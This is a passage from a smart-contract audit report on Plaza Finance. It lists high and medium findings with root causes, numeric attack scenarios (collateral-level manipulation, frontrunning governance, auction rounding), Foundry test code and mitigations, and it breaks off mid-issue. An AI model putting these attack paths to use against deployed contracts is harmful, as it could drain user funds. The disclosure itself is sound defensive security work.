0x52, 0xDemon, 0xadrii, 0xlucky, 0xmystery, Abhan1041, Beejay, BugAttacker, ChainProof, Darinrikusham, DeLaSoul, Etherking, Goran, Harry\_cryptodev, JohnTPark24, Kirkeelee, KupiaSec, Kyosi, MysteryAuditor, Pablo, Saurabh\_Singh, Strapontin, ZeroTrust, ZoA, appet, bigbear1229, bladeee, bretzel, bube, davidjohn241018, dobrevaleri, farismaulana, future, moray5554, novaman33, pessimist, prosper, sl1, t0x1c, tvdung94, ydlee

### Summary

[Here](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/Pool.sol#L700C1-L720C4) fee is charged from `lastFeeClaimTime` to current time but with current `reserveToken` token pool balance. But fee should be charged on every reserveToken balance is changed. That can be accomplished via `claimFees` function is invoked every user `create` and `redeem` activities. 

### Root Cause

Fee is charged based on current `reserveToken` balance where `feeBeneficiary` is invoked  `claimFees` function. But time to time `reserveToken` can be changed. So fee should be calculated each and every time when `reserveToken` balance is changed. 

```solidity
  function claimFees() public nonReentrant {
    require(msg.sender == feeBeneficiary || poolFactory.hasRole(poolFactory.GOV_ROLE(), msg.sender), NotBeneficiary());
    uint256 feeAmount = getFeeAmount();
    
    if (feeAmount == 0) {
      revert NoFeesToClaim();
    }
    
    lastFeeClaimTime = block.timestamp;
    IERC20(reserveToken).safeTransfer(feeBeneficiary, feeAmount);
    
    emit FeeClaimed(feeBeneficiary, feeAmount);
  }

  /**
   * @dev Returns the amount of fees to be claimed.
   * @return The amount of fees to be claimed.
   */
  function getFeeAmount() internal view returns (uint256) {
    return (IERC20(reserveToken).balanceOf(address(this)) * fee * (block.timestamp - lastFeeClaimTime)) / (PRECISION * SECONDS_PER_YEAR);
  }
```

### Internal Pre-conditions

Can happen in normal operation.

### External Pre-conditions

None

### Attack Path

1. Consider this scenario , pool is consist of 10e18 reserveToken throughout the year at the year end , some one is deposited 1000e18 reserveToken , now `feeBeneficiary` is called `claimFees` , here fee is overcharged. meaning fee is calculated as 1000e18 token is in pool throughout the year. 
2. pool is consist of 1000e18 reserveToken through out  the year at the year end , most of users are redeem , due to that reserveToken balance is 10e18  , now `feeBeneficiary` is called `claimFees` , here fee is undercharged. meaning fee is calculated as 10e18 token is in pool throughout the year.  

### Impact

1. Fee is not collected correctly so that it could be overcharged or undercharged . 

### PoC

_No response_

### Mitigation

`claimFees` can be invoked inside of  [_create](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/Pool.sol#L222C12-L222C19) and [_redeem](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/Pool.sol#L383C12-L383C19) functions. 

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/164




# Issue H-9: `COLLATERAL_THRESHOLD` should be set to `125%` instead of `120%`. 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/895 

## Found by 
KupiaSec, makeWeb3safe, werulez99, zraxx

### Summary

The price of `BondToken` depends on whether the `collateralLevel` is above or below `120%`.

- If `collateralLevel <= 120%`:

  `80%` of TVL is allocated for `BondToken`, so the price of `BondToken` is less than `120 * 80% = 96`.
- If `collateralLevel > 120%`:

  The price of `BondToken` is set to 100.

As you can see, when the `collateralLevel` moves from below to above `120%`, the price of `BondToken` changes from `<= 96` to `100`, indicating that the price curve is not continuous.

To ensure continuity, `125%` should be used instead of `120%`.

### Root Cause

The [getRedeemAmount()](https://github.com/sherlock-audit/2024-12-plaza-finance/tree/main/plaza-evm/src/Pool.sol#L511-L518) function calculates the `redeemRate` based on whether the `collateralLevel` is above or below `120%`.

- If `collateralLevel <= 120%`:
  ```solidity
    redeemRate = (tvl * multiplier) / assetSupply
  ```
  Here, `multiplier` is `80%`, and `assetSupply` is the total supply of `BondToken`. Since the `collateralLevel` is less than `120%`, the `redeemRate` will be less than `120 * 80% = 96`.
- If `collateralLevel > 120%`:
  ```solidity
    redeemRate = 100
  ```
As observed, when the `collateralLevel` moves from below to above `120%`, the `redeemRate` is not continuous, moves from `96` to `100` suddenly.

This means that when the `collateralLevel` is around `120%`, a minor increase in TVL can lead to a significant price increase of `BondToken`, resulting in substantial losses for `LeverageToken` holders, even as the TVL increases.

```solidity
      function getRedeemAmount(
        ...
        
        uint256 redeemRate;
511     if (collateralLevel <= COLLATERAL_THRESHOLD) {
          redeemRate = ((tvl * multiplier) / assetSupply);
        } else if (tokenType == TokenType.LEVERAGE) {
          redeemRate = ((tvl - (bondSupply * BOND_TARGET_PRICE)) / assetSupply) * PRECISION;
515     } else {
          redeemRate = BOND_TARGET_PRICE * PRECISION;
        }
        
        // Calculate and return the final redeem amount
        return ((depositAmount * redeemRate).fromBaseUnit(oracleDecimals) / ethPrice) / PRECISION;
      }
```

### Internal pre-conditions

### External pre-conditions

### Attack Path

Let's consider the following scenario:

1. Current State of the Pool:
    - `TVL`: 1190
    - `bondSupply`: 10
    - `collaterlLevel`: 119%
    - TVL for `BondToken`: 1190 * 0.8 = 952
    - TVL for `LeverageToken`: 1190 * 0.2 = 238
2. Price of Underlying Rises:
    - `TVL`: 1210 (due to price increase)
    - `bondSupply`: 10
    - `collaterlLevel`: 121%
    - TVL for `BondToken`: 100 * 10 = 1000
    - TVL for `LeverageToken`: 1210 - 100 = 210

As you can see, `LeverageToken` holders incur a loss of `238 - 210 = 28`, even though the underlying price has increased.

### Impact

Even though the price of the underlying increases, `LeverageToken` holders incur a loss.

### PoC

### Mitigation

For `COLLATERAL_THRESHOLD`, use `125%` instead of `120%`.

# Issue H-10: Users can sell `BondToken` at a higher price by manipulating the `collateralLevel` from `< 120%` to `> 120%` by purchasing `LeverageToken`. 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/896 

## Found by 
056Security, 0xc0ffEE, KupiaSec, bigbear1229, future, novaman33, t0x1c, zraxx

### Summary

Buying `LeverageToken` increases TVL, which in turn raises the `collateralLevel`.

When redeeming `BondToken`, the redemption amount is determined by the `collateralLevel`. The calculation of the redemption amount varies depending on whether the `collateralLevel` is above or below `120%`.

Therefore, `BondToken` redeemers can acquire more underlying assets by manipulating the `collateralLevel` from `< 120%` to `> 120%` through purchasing `LeverageToken`, ultimately resulting in a profit.

### Root Cause

The [getRedeemAmount()](https://github.com/sherlock-audit/2024-12-plaza-finance/tree/main/plaza-evm/src/Pool.sol#L511-L518) function calculates the `redeemRate` based on whether the `collateralLevel` is above or below `120%`.

When `collateralLevel < 120%`, `80%` of TVL is allocated for `BondToken` holders. In contrast, when `collateralLevel > 120%`, the price of `BondToken` is fixed at `100`.

This vulnerability provides malicious users with an opportunity to manipulate the `collateralLevel` by purchasing `LeverageToken`, allowing them to redeem their `BondToken`s at a higher rate.

```solidity
      function getRedeemAmount(
        ...
        
        uint256 collateralLevel;
        if (tokenType == TokenType.BOND) {
498       collateralLevel = ((tvl - (depositAmount * BOND_TARGET_PRICE)) * PRECISION) / ((bondSupply - depositAmount) * BOND_TARGET_PRICE);
        } else {
          multiplier = POINT_TWO;
          assetSupply = levSupply;
502       collateralLevel = (tvl * PRECISION) / (bondSupply * BOND_TARGET_PRICE);
        ...
        
        uint256 redeemRate;
511     if (collateralLevel <= COLLATERAL_THRESHOLD) {
          redeemRate = ((tvl * multiplier) / assetSupply);
513     } else if (tokenType == TokenType.LEVERAGE) {
          redeemRate = ((tvl - (bondSupply * BOND_TARGET_PRICE)) / assetSupply) * PRECISION;
515     } else {
          redeemRate = BOND_TARGET_PRICE * PRECISION;
        }
        
        ...
      }
```

### Internal pre-conditions

### External pre-conditions

### Attack Path

Let's consider the following scenario:

- Current State of the Pool:
    - `levSupply`: 100
    - `bondSupply`: 100
    - `TVL`: $11000
- Bob wants to redeem `50 BondToken`. Expected Values:
    - `collaterlLevel`: (11000 - 100 * 50) / (100 - 50) = 120% (see line 498)
    - Price of `BondToken`: 11000 * 0.8 / 100 = 88 (see the case at line 511)
    - Price of `LeverageToken`: 11000 * 0.2 / 100 = 22 (see the case at line 511)

As a result, Bob can only redeem `50 * 88 = 4400`.

However, Bob manipulates `collateralLevel`.

1. Bob buys `10 LeverageToken` by using `$220`:
    - `levSupply`: 100 + 10 = 110
    - `bondSupply`: 100
    - `TVL`: 11000 + 220 = 11220
2. Bob then sells `50 BondToken`:
    - `collaterlLevel`: (11220 - 100 * 50) / (100 - 50) = 124.4% (see line 498)
    - price of `BondToken`: 100 (see the case at line 515)
    
    Bob receives `100 * 50 = 5000`.
    
    - `TVL`: 11220 - 5000 = 6220
    - `bondSupply`: 100 - 50 = 50
3. Bob sells back `10 LeverageToken`.
    - `collaterlLevel`: 6220 / 50 = 124.4% (see line 502)
    - Price of `LeverageToken`: (6220 - 100 * 50) / 110 = 11 (see the case at line 513)
    - Bob receives `10 * 11 = 110`.

As you can see, Bob was initially able to redeem only `$4400`. However, by manipulating `collateralLevel`, he can increase his redemption to `-220 + 5000 + 110 = 4890`. Thus, he can profit by `4890 - 4400 = 490`.

### Impact

`BondToken` redeemers can obtain more than they are entitled to by manipulating the `collateralLevel` through purchasing `LeverageToken`.

### PoC

### Mitigation

The current price mechanism should be improved.

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/155




# Issue H-11: Incorrect price representation 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/1016 

## Found by 
0x23r0, 0xc0ffEE, 10ap17, Ryonen, wickie

### Summary

The `latestRoundData()` function in the `BondOracleAdapter` contract calculates a price using the `PriceX96` format. However, the returned price is not converted to a format with a specified decimal precision (e.g., 18 decimals, as in a Chainlink oracle). As a result, the price returned by the function will be completely different from the expected decimal-based price format. This discrepancy leads to significant mistakes in asset valuation and renders every calculation using this price incorrect.

```solidity
function latestRoundData()
    external
    view
    returns (uint80, int256, uint256, uint256, uint80){
    uint32[] memory secondsAgos = new uint32[](2);
    secondsAgos[0] = twapInterval; // from (before)
    secondsAgos[1] = 0; // to (now)

    (int56[] memory tickCumulatives, ) = ICLPool(dexPool).observe(secondsAgos);

    uint160 getSqrtTwapX96 = TickMath.getSqrtRatioAtTick(
      int24((tickCumulatives[1] - tickCumulatives[0]) / int56(uint56(twapInterval)))
    );

    return (uint80(0), int256(getPriceX96FromSqrtPriceX96(getSqrtTwapX96)), block.timestamp, block.timestamp, uint80(0));
  }
```

### Root Cause

In `BondOracleAdapter's` `latestRoundData` function the calculated price is not converted from priceX96 format to format with decimals (e.g. 18 decimals), which will result that the returned price is fundamentally different from what is required for correct asset valuation and subsequent calculations.

https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/BondOracleAdapter.sol#L99

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

1. The `latestRoundData()` function will be called.
2. The function will calculate the price in the `PriceX96` format.
3. The returned price will not be converted to a format with decimals of precision (e.g., 18 decimals).
4. Since the returned format is incorrect, the valuation of asset will be wrong.
5. All dependent calculations, that use the returned price, will produce incorrect results.

### Impact

The failure to return a price in the correct format causes incorrect asset valuations, which would lead to incorrect calculations, potentially causing financial losses for users.

### PoC


Step 1: Fetch sqrtPriceX96 from the Pool Contract
We will be using usdc/weth pool (random pool on polygon network, which doesn't matter, since we are just proving concept)

Contract Address: 0x45dda9cb7c25131df268515131f647d726f50608
Function: slot0()
Output: sqrtPriceX96 = 1390618563380010078436460929963734

Step 2: Calculate priceX96 from sqrtPriceX96
Function: getPriceX96FromSqrtPriceX96
```solidity

function getPriceX96FromSqrtPriceX96(sqrtPriceX96) {
  return FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, FixedPoint96.Q96);
}
```
Output: 24408239790603697707980053009065971527

This result is result that would be return form `latestRoundData` function, by current implementation, which is nowhere near the realistic price of weth in usdc token.

Step 3: Convert priceX96 to Actual Price with 18 Decimals
Next step, is to convert that price to the actual price that is in 18 decimals, since usdc has 6 decimals, and weth has 18, the formula would be:
```solidity
FullMath.mulDiv(10 ** (18 + decimals1 - decimals0), FixedPoint96.Q96, priceX96)
```
Output: 3245959692053023671448 

The result is in 18 decimals and represents around 3245,95 usdc fer weth.

### Mitigation

Consider using the approach used by the Saltio.IO project, which ensures proper conversion to the 18-decimal (in this case) standard. The implementation is as follows:
```solidity
// Returns the price of token0 * (10**18) in terms of token1
function _getUniswapTwapWei(IUniswapV3Pool pool, uint256 twapInterval) public view returns (uint256) {
    uint32;
    secondsAgo[0] = uint32(twapInterval); // from (before)
    secondsAgo[1] = 0; // to (now)

    // Get the historical tick data using the observe() function
    (int56[] memory tickCumulatives, ) = pool.observe(secondsAgo);
    int24 tick = int24((tickCumulatives[1] - tickCumulatives[0]) / int56(uint56(twapInterval)));
    uint160 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(tick);

    // Convert the sqrtPriceX96 to a price with 18 decimals
    uint256 p = FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, FixedPoint96.Q96);

    uint8 decimals0 = ERC20(pool.token0()).decimals();
    uint8 decimals1 = ERC20(pool.token1()).decimals();

    if (decimals1 > decimals0) {
        return FullMath.mulDiv(10 ** (18 + decimals1 - decimals0), FixedPoint96.Q96, p);
    }

    if (decimals0 > decimals1) {
        return (FixedPoint96.Q96 * (10 ** 18)) / (p * (10 ** (decimals0 - decimals1)));
    }

    return (FixedPoint96.Q96 * (10 ** 18)) / p;
}
```

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/158




# Issue M-1: Failed auction period still update `sharesPerToken` like it is succeed 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/48 

## Found by 
056Security, 0rpse, 0x23r0, 0x52, 0xEkko, 0xShahilHussain, 0xadrii, 0xlucky, 0xmystery, Abhan1041, Adotsam, Aymen0909, ChainProof, Hueber, MysteryAuditor, Pablo, SamuelTroyDomi, Schnilch, ZoA, bladeee, bretzel, carlitox477, dobrevaleri, farismaulana, future, moray5554, novaman33, phn210, robertauditor, shui, silver\_eth, sl1, y4y, zxriptor

### Summary

The way bondETH holder get the coupon (USDC) is through the auction where protocol would auction amount of underlying asset for coupon to be later distributed to bondETH holder of current period.
But the `BondToken::increaseIndexedAssetPeriod` would always push the default value of `sharesPerToken` to the previous period to `globalPool.previousPoolAmounts` array when new auction start, regardless if the previous auction is succeed or not.

### Root Cause

When auction is succeed, the coupon collected would later be sent to pool, and then pool would distribute and allocate the amount into distribute contract, and if it fails no coupon is sent to the pool thus making no amount to distribute and allocated to distribute contract and any previous bid can be claimed.

[Auction.sol#L336-L350](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L336-L350):
```solidity
  function endAuction() external auctionExpired whenNotPaused {
    if (state != State.BIDDING) revert AuctionAlreadyEnded();

    if (currentCouponAmount < totalBuyCouponAmount) {
      state = State.FAILED_UNDERSOLD;
    } else if (totalSellReserveAmount >= (IERC20(sellReserveToken).balanceOf(pool) * poolSaleLimit) / 100) {
        state = State.FAILED_POOL_SALE_LIMIT;
    } else {
      state = State.SUCCEEDED;
      Pool(pool).transferReserveToAuction(totalSellReserveAmount);
      IERC20(buyCouponToken).safeTransfer(beneficiary, IERC20(buyCouponToken).balanceOf(address(this)));
    }

    emit AuctionEnded(state, totalSellReserveAmount, totalBuyCouponAmount);
  }
```

regardless, anyone can call `Pool::startAuction` to start new auction. and this is problematic because inside the function the `bondToken.increaseIndexedAssetPeriod(sharesPerToken)` is called.

[Pool.sol#L530-L571](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L530-L571)
```solidity
  function startAuction() external whenNotPaused() {
.
.
.

    // Increase the bond token period
@>  bondToken.increaseIndexedAssetPeriod(sharesPerToken);
.
.
.
  }
```

when this function called, the previous failed auction data would then get pushed into the previousPoolAmounts array:

[BondToken.sol#L217-L229](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BondToken.sol#L217-L229)

```solidity
  function increaseIndexedAssetPeriod(uint256 sharesPerToken) public onlyRole(DISTRIBUTOR_ROLE) whenNotPaused() {
    globalPool.previousPoolAmounts.push(
      PoolAmount({
        period: globalPool.currentPeriod,
        amount: totalSupply(),
@>      sharesPerToken: globalPool.sharesPerToken
      })
    );
    globalPool.currentPeriod++;
    globalPool.sharesPerToken = sharesPerToken;

    emit IncreasedAssetPeriod(globalPool.currentPeriod, sharesPerToken);
  }
```
the `sharesPerToken` of previous period is updated by using default value of `globalPool.sharesPerToken` (docs said it would be equal to 2.5 USD)
even though there are no coupon get sent into distributor contract.

but nonetheless, the user can still claim the shares of 2 period even though there are no new coupon token inside the distributor contract.
and the claim function would then have liquidity problem

[Distributor.sol#L78-L110](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Distributor.sol#L78-L110)
```solidity
  function claim() external whenNotPaused nonReentrant {
    BondToken bondToken = Pool(pool).bondToken();
    address couponToken = Pool(pool).couponToken();

    if (address(bondToken) == address(0) || couponToken == address(0)){
      revert UnsupportedPool();
    }

    (uint256 currentPeriod,) = bondToken.globalPool();
    uint256 balance = bondToken.balanceOf(msg.sender);
@>  uint256 shares = bondToken.getIndexedUserAmount(msg.sender, balance, currentPeriod)
                              .normalizeAmount(bondToken.decimals(), IERC20(couponToken).safeDecimals());

    if (IERC20(couponToken).balanceOf(address(this)) < shares) {
      revert NotEnoughSharesBalance();
    }
   
    // check if pool has enough *allocated* shares to distribute
    if (couponAmountToDistribute < shares) {
      revert NotEnoughSharesToDistribute();
    }

    // check if the distributor has enough shares tokens as the amount to distribute
    if (IERC20(couponToken).balanceOf(address(this)) < couponAmountToDistribute) {
      revert NotEnoughSharesToDistribute();
    }

    couponAmountToDistribute -= shares;    
    bondToken.resetIndexedUserAssets(msg.sender);
    IERC20(couponToken).safeTransfer(msg.sender, shares);
    
    emit ClaimedShares(msg.sender, currentPeriod, shares);
  }
```

notice that shares would be increased by adding the failed auction sharePerToken amount

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

1. auction 0 start -> end successfully and 50 USD coupon is sent to be claimed in distributor contract
2. each holder can claim 2.5 USD per bondETH in this period
3. auction 1 start -> end with undersold, no new usd coupon sent to distributor contract
4. each holder can claim 2.5 + 2.5 USD per bondETH held in this period if they held for 2 period
5. alice held since period 0, and have 10 bondETH. she can claim 10 * 5 = 50 USD
6. bob held since period 0, and have 10 bondETH. he cant claim because distributor contract now have 0 USD

### Impact

holder of bondETH token can not claim shares if they late.
discrepancy in the can be claimed amount vs actual coupon token held inside distributor contract would make not enough coupon to be claimed for all bondETH holder

### PoC

_No response_

### Mitigation

when auction fails, consider to update the sharesPerToken for the failed period auction to 0.

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/157




# Issue M-2: Bid with high price effectively can end up with lower price 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/198 

The protocol has acknowledged this issue.

## Found by 
ZoA

### Summary

In the `removeExcessBids` function, when the total bid amount exceeds `totalBuyCouponAmount`, the contract reduces the `sellCouponAmount` and `buyReserveAmount` of the lowest-ranked bidder proportionally. This reduction introduces precision loss due to integer division, leading to a scenario where bids initially made at a high price effectively end up with a lower price..

### Root Cause

On the line [Auction.sol#L281](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/Auction.sol#L281), `removeExcessBids` function reduces `sellCouponAmount` and `buyReserveAmount` proportionally. However, the reduction uses integer arithmetic, causing rounding errors that alter the price ratio (`sellCouponAmount / buyReserveAmount`).

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

_No response_

### PoC

- Assume `totalBuyCouponAmount = 10e18`, `slotSize = 1e18` and `currentCouponAmount = 10e18`(full charged).
- The lowest bidder(bidder 1): `buyReserveAmount = 1e8`, `sellCouponAmount = 1e18`
- bidder 2: bids with `buyReserveAmount = 9e8`, `sellCouponAmount = 9e18`
  - price is same as the bidder 1's but sellCouponAmount is larger.
  - **bidder 1** is removed and bidder 2 enters the list.
  - **bidder 2**'s values change:
    - `amountToRemove = 8e18`
    - `proportion = (amountToRemove * 1e18) / sellCouponAmount = 888888888888888888`
    - new `sellCouponAmount = 1e18`
    - new `buyReserveAmount = 9e8 - [9e8 * proportion] / 1e18 = 1e8 + 1`
- Result: **Bidder 2** has the lower price than **Bidder 1**.

### Impact

1. Bid with high price effectively can end up with lower price.
2. The lowest bidder can repeat the same operation as above to increase the size of `buyReserveAmount` without changing `sellCouponAmount`. 
  Attacker can either profit by 1wei(0.001 usd)  which is more than the gas fee if the token is WBTC. In this case, even if the attacker's gain is not great due to gas fees, the protocol loses a lot of reserve tokens.


### Mitigation

check whether the `buyReserveAmount` size increases before and after the bid.

```solidity
function bid(uint256 buyReserveAmount, uint256 sellCouponAmount) external auctionActive whenNotPaused returns(uint256) {
    ...
    uint256 totalSellReserveAmountBefore = totalSellReserveAmount;

    Bid memory newBid = Bid({
    ...
    removeExcessBids();

    uint256 totalSellReserveAmountAfter = totalSellReserveAmount;
    if(totalSellReserveAmountBefore < totalSellReserveAmountAfter) revert TotalSellReserveAmountIncreased();
    ...
}
```

# Issue M-3: User may lose funds if they call `BalancerRouter::joinBalancerAndPredeposit` 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/278 

The protocol has acknowledged this issue.

## Found by 
056Security, 0x23r0, 0xDemon, 0xShahilHussain, 0xc0ffEE, Adotsam, JohnTPark24, Kenn.eth, Kirkeelee, MysteryAuditor, Pablo, X0sauce, Xcrypt, ZeroTrust, ZoA, bladeee, dobrevaleri, farismaulana, future, hrmneffdii, makeWeb3safe, phoenixv110, super\_jack, tutiSec, y4y

### Summary

[`BalancerRouter::joinBalancerAndPredeposit`](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BalancerRouter.sol#L23C1-L40C6)  calls [`Predeposit::deposit`](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/PreDeposit.sol#L118C1-L134C4) to deposit balancerPoolTokens into the `Predeposit` contract. In the `Predeposit::deposit` if `reserveAmount + amount > reserveCap`, the difference is deposited and the rest remains with `msg.sender`, which in this case is the `BalancerRouter`.  

The user will have less than expected amount deposited in `Predeposit` without getting refund for the rest of the funds. 

```js
      function _deposit(uint256 amount, address onBehalfOf) private checkDepositStarted checkDepositNotEnded {
        if (reserveAmount >= reserveCap) revert DepositCapReached();
    
        address recipient = onBehalfOf == address(0) ? msg.sender : onBehalfOf;
    
        // if user would like to put more than available in cap, fill the rest up to cap and add that to reserves
@>        if (reserveAmount + amount >= reserveCap) {
@>          amount = reserveCap - reserveAmount;
        }
    
        balances[recipient] += amount;
        reserveAmount += amount;
    
        IERC20(params.reserveToken).safeTransferFrom(msg.sender, address(this), amount);
    
        emit Deposited(recipient, amount);
      }
```

### Root Cause

_No response_

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

Assume `reserveCap` is `1,000 BPT` and `reserveAmount` is `900BPT` 
User calls `BalancerRouter::joinBalancerAndPredeposit` and deposits assets worth `500 BPT`
Only `100 BPT` is deposited and users loses `400 BPT` which is trapped inside the contract.


### Impact

Loss of funds

### PoC

_No response_

### Mitigation

```diff
        function joinBalancerAndPredeposit(
            bytes32 balancerPoolId,
            address _predeposit,
            IAsset[] memory assets,
            uint256[] memory maxAmountsIn,
            bytes memory userData
        ) external nonReentrant returns (uint256) {
            // Step 1: Join Balancer Pool
            uint256 balancerPoolTokenReceived = joinBalancerPool(balancerPoolId, assets, maxAmountsIn, userData);
    
            // Step 2: Approve balancerPoolToken for PreDeposit
            balancerPoolToken.safeIncreaseAllowance(_predeposit, balancerPoolTokenReceived);
+            uint256 BPTBalanceBefore = balancerPoolToken.balanceOf(address(this));

            // Step 3: Deposit to PreDeposit
            PreDeposit(_predeposit).deposit(balancerPoolTokenReceived, msg.sender);
+         uint256 BPTBalanceAfter = balancerPoolToken.balanceOf(address(this));
+          if (BPTBalanceAfter - BPTBalanceBefore > 0) {
+             revert ( 'ReserveCap Reached` ); }
            return balancerPoolTokenReceived;
        }
```

# Issue M-4: levETH Cannot Be Bought. 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/333 

The protocol has acknowledged this issue.

## Found by 
KupiaSec, PeterSR, almurhasan, dobrevaleri, future, sl1


### Summary
If all levETH owners sell their levETH, no one will be able to buy levETH.

### Root Cause
The current implementation allows for the sale of all levETH without checking if the total supply has reached zero. 
This results in a scenario where the price cannot be calculated, making the contract effectively useless

https://github.com/sherlock-audit/2024-12-plaza-finance/tree/main/plaza-evm/src/Pool.sol#L405
```solidity
Pool.sol
    function _redeem(
        ...) private returns(uint256) {
        ...
        // Burn derivative tokens
        if (tokenType == TokenType.BOND) {
            bondToken.burn(msg.sender, depositAmount);
        } else {
405:        lToken.burn(msg.sender, depositAmount);
        }
```

### Internal pre-conditions
N/A

### External pre-conditions
N/A

### Attack Path
N/A

### PoC
When the levSupply reaches zero, the contract lacks a mechanism to calculate the price of levETH. 
This results in an inability for users to purchase levETH.

https://github.com/sherlock-audit/2024-12-plaza-finance/tree/main/plaza-evm/src/Pool.sol#L331-L336
```solidity
Pool.sol
    function getCreateAmount(
    ...) public pure returns(uint256) {
    ...
    if (collateralLevel <= COLLATERAL_THRESHOLD) {
      if (tokenType == TokenType.LEVERAGE && assetSupply == 0) {
331:    revert ZeroLeverageSupply();
      }
      creationRate = (tvl * multiplier) / assetSupply;
    } else if (tokenType == TokenType.LEVERAGE) {
      if (assetSupply == 0) {
336:    revert ZeroLeverageSupply();
      }

      uint256 adjustedValue = tvl - (BOND_TARGET_PRICE * bondSupply);
      creationRate = (adjustedValue * PRECISION) / assetSupply;
    }
    
    return ((depositAmount * ethPrice * PRECISION) / creationRate).toBaseUnit(oracleDecimals);
  }
```  

In sherlock docs:
>V. How to identify a medium issue:
>2. Breaks core contract functionality, rendering the contract useless or leading to loss of funds that's relevant to the affected party.

The known issue `3.20: Missing a zero-value check for assetSupply` refers to the lack of a mechanism for price calculation when the amount of levETH is zero. 
The root cause of this report is the absence of a check during the redemption process. 
Therefore, these two issues are not duplicates.

### Impact
The functionality of the core contract is compromised, rendering the contract useless.

### Mitigation
```diff
Pool.sol
    function _redeem(
        ...) private returns(uint256) {
        ...
        // Burn derivative tokens
        if (tokenType == TokenType.BOND) {
            bondToken.burn(msg.sender, depositAmount);
        } else {
+           require(depositAmount < lToken.totalbalance(),"");
405:        lToken.burn(msg.sender, depositAmount);
        }
```

# TestCode
https://github.com/sherlock-audit/2024-12-plaza-finance/tree/main/plaza-evm/test/Pool.t.sol#L1156
Changed lined function to following code.

```solidity
  function testCreateRedeemWithFees() public {
    vm.startPrank(governance);

    // Create a pool with 2% fee
    params.fee = 20000; // 2% fee (1000000 precision)
    params.feeBeneficiary = address(0x942);

    // Mint and approve reserve tokens
    Token rToken = Token(params.reserveToken);
    rToken.mint(governance, 120 ether);
    rToken.approve(address(poolFactory), 120 ether);

    Pool pool = Pool(poolFactory.createPool(params, 120 ether, 3000 ether, 200 ether, "", "", "", "", false));
    
    LeverageToken lToken = LeverageToken(pool.lToken());
    lToken.transfer(user, lToken.balanceOf(governance));

    vm.stopPrank();

    // User creates leverage tokens
    vm.startPrank(user);
    console2.log("Before redeem");
    pool.redeem(Pool.TokenType.LEVERAGE, lToken.balanceOf(user), 0);
    console2.log(" After redeem");
    console2.log("Before create");
    pool.create(Pool.TokenType.LEVERAGE, 10 ether, 0);
    console2.log(" After Create");

    vm.stopPrank();

    // Reset state
    rToken.burn(user, rToken.balanceOf(user));
    rToken.burn(address(pool), rToken.balanceOf(address(pool)));
  }
```

forge test --match-test "testCreateRedeemWithFees" -vv

Result:
>[FAIL: ZeroLeverageSupply()] testCreateRedeemWithFees() (gas: 2054536)
>Logs:
>  Before redeem
>   After redeem
>  Before create




# Issue M-5: Wrong modifier on `PreDeposit::setBondAndLeverageAmount` function leads to big differences in user balances 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/353 

## Found by 
0xadrii, 0xl33, ZoA

### Summary

`PreDeposit::setBondAndLeverageAmount` function has `checkDepositNotEnded` modifier, which means it can only be called while deposit phase has not ended yet. The problem with this is that users are free to call `PreDeposit::deposit` and `PreDeposit::withdraw` around the time of this function being called by governance, meaning that `setBondAndLeverageAmount` function can be frontrun/backrun by a griefer. 

Consider this scenario:
1. Griefer deposits big amount of reserve tokens while deposit phase is active
2. Regular users deposit while deposit phase is active
3. Governance calls `setBondAndLeverageAmount` function at the end of deposit phase
4. Griefer frontruns the transaction and calls `withdraw`, inputting the same amount that they deposited before
5. Griefer's transaction executes, reducing `PreDeposit` contract's balance of reserve tokens by a lot
6. Governance's transaction executes, setting `bondAmount` and `leverageAmount` to values that were correct before the withdrawal happened, but not correct anymore, because reserve token balance is much smaller now
7. Deposit phase ends and governance is not able to call `setBondAndLeverageAmount` function anymore, due to the modifier mentioned previously
8. Pool gets created
9. Users who deposited in `PreDeposit` claim their tokens
10. New users call `Pool::create` and receive very different amounts of tokens than users who deposited in `PreDeposit`, due to total supplies of `bondETH` and `levETH` being inflated
11. Big differences in `bondETH` balances lead to users receiving different amounts of coupon tokens during distribution, due to `sharesPerToken` being the same for everyone

You can see the scenario described above in the PoC section.

